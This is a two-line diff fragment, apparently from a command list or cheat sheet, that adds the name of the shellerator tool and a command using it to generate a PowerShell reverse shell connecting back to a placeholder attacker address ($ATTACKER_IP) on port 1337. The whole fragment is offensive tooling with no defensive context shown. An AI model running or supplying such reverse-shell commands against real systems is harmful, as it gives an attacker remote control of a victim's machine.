@@ -1,0 +1,2 @@
+shellerator
+shellerator --reverse-shell --ip "$ATTACKER_IP" --port 1337 --type powershell
